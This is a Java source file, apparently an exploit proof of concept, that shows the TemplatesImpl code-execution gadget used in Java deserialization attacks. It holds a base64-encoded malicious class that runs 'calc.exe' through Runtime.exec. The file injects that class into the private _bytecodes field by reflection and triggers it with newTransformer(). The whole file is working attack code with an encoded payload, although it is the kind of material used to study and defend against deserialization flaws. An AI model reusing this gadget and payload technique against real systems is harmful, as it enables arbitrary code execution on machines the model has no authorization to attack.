package templateimpl;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.TransformerConfigurationException;
import java.lang.reflect.Field;
import java.util.Base64;

public class TemplateImplExp {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB" +
                "AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp" +
                "dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl" +
                "L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu" +
                "YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z" +
                "dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv" +
                "bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu" +
                "ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007" +
                "TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t" +
                "L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k" +
                "bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v" +
                "RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl" +
                "cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs" +
                "VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj" +
                "b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy" +
                "YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p" +
                "bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0" +
                "UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp" +
                "bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO" +
                "KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA" +
                "DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA" +
                "AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE" +
                "AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ" +
                "AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=" );
        TemplatesImpl obj = new TemplatesImpl();
        Class aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        Field name = aClass.getDeclaredField("_name");
        Field tfactory = aClass.getDeclaredField("_tfactory");
        bytecodes.setAccessible(true);
        name.setAccessible(true);
        tfactory.setAccessible(true);
        bytecodes.set(obj,new byte[][]{code});
        name.set(obj,"xsw6a");
        tfactory.set(obj,new TransformerFactoryImpl());
        obj.newTransformer();
    }
}
